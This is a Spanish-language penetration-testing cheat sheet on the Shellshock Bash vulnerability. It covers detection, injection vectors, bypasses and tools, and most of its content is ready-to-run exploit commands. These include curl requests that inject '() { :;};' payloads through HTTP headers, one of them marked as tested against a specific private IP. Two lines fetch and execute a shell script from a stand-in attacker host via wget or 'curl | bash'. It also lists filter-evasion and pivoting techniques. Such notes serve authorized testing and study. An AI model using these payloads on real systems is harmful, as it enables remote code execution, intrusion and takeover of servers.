
---
Tags: #web #rfi #bash #curl

---
## 1️⃣ Definición

Shellshock es una **vulnerabilidad crítica en Bash**, descubierta en 2014, que permite **ejecutar código arbitrario** a través de **variables de entorno manipuladas**.  
Se explota principalmente en **CGI scripts web**, pero también puede afectar otros servicios que ejecuten Bash al procesar datos externos.

- **Impacto:** Ejecución remota de comandos (RCE)
    
- **Versiones vulnerables:** Bash < 4.3.27 (varía según parches)
    
- **Servicios afectados:** CGI, SSH, DHCP scripts, cron jobs que usan Bash
    

---

## 2️⃣ Cómo encontrar la vulnerabilidad

| Método               | Descripción                               | Comando/ejemplo                                                                    |
| -------------------- | ----------------------------------------- | ---------------------------------------------------------------------------------- |
| **Prueba local**     | Detectar vulnerabilidad en Bash instalada | `env x='() { :;}; echo vulnerable' bash -c "echo test"`                            |
| **CGI Scripts**      | Exploit remoto de CGI que ejecuta Bash    | `curl -H "User-Agent: () { :;}; /bin/bash -c 'id'" http://target/cgi-bin/vuln.cgi` |
| **Servicios de red** | DHCP, cron o scripts que ejecuten Bash    | Inyectar payload en variables de entorno usadas por Bash                           |

---

## 3️⃣ Vectores de ataque comunes

|Vector|Descripción|Ejemplo de payload|
|---|---|---|
|**HTTP Header Injection**|Inyectar payloads en headers que CGI procesa|`User-Agent: () { :;}; /bin/bash -c "whoami"`|
|**Query string / GET parameters**|Inyección en variables exportadas a Bash|`http://target/cgi-bin/vuln.cgi?x=() { :;}; /bin/bash -c "id"`|
|**POST requests / body variables**|Evade filtros que bloquean GET|Payload enviado en body como variable de entorno|
|**RFI + Shellshock**|Combina Remote File Inclusion con Shellshock|`curl http://target/cgi-bin/vuln.cgi -H 'X-Remote: () { :;}; wget http://attacker/shell.sh -O /tmp/s.sh; bash /tmp/s.sh'`|
|**Servicios de red**|DHCP, cron, scripts automáticos|Payload en archivos de configuración procesados por Bash|

---

## 4️⃣ Ejemplos de exploits

### Ejemplo básico HTTP Header

`curl -H "User-Agent: () { :;}; /bin/bash -c 'id'" http://target/cgi-bin/vuln.cgi`

### Ejemplo GET [!] Importante (Funciona prueba)

`curl -s -X GET "http://192.168.187.132/cgi-bin/test.sh" -H "User-Agent: () { :;}; echo; /bin/bash -c 'id'";`

### Ejemplo RFI + ejecución remota

`curl http://target/cgi-bin/vuln.cgi -H 'X-Remote: () { :;}; curl http://attacker/shell.sh | bash'`

---

## 5️⃣ Bypasses y técnicas avanzadas

|Técnica|Descripción|
|---|---|
|**Base64 / URL encoding**|Evadir filtros de caracteres|
|**Codificación doble**|Para filtros parciales|
|**POST requests**|Algunos filtros solo bloquean GET|
|**Chaining con RCE local**|Usar Shellshock para ejecutar scripts locales|
|**Pivoting**|Usar Shellshock para ejecutar otros exploits en red interna|

---

## 6️⃣ Herramientas útiles

|Herramienta|Uso|
|---|---|
|**curl / wget**|Pruebas manuales de headers HTTP y variables|
|**Metasploit**|Exploit automatizado CGI vulnerable: `exploit/unix/http/apache_mod_cgi_bash_env_exec`|
|**Nikto**|Escaneo automático de CGI vulnerables|
|**Nmap + NSE scripts**|Detección remota de Shellshock|
|**Burp Suite / OWASP ZAP**|Manipulación de headers y parámetros para prueba manual|

---

## 7️⃣ Consejos prácticos

1. **Prueba inofensiva primero:** `echo test` para confirmar vulnerabilidad sin dañar el sistema.
    
2. **Evita payloads destructivos:** hasta confirmar explotación.
    
3. **Revisar versiones de Bash:** `bash --version` para confirmar vulnerabilidad.
    
4. **Combinable con otros vectores RCE:** CGI + RFI, headers HTTP + scripts locales.
    
5. **Logs:** Revisa los logs del servidor para ver ejecución de payloads y rutas.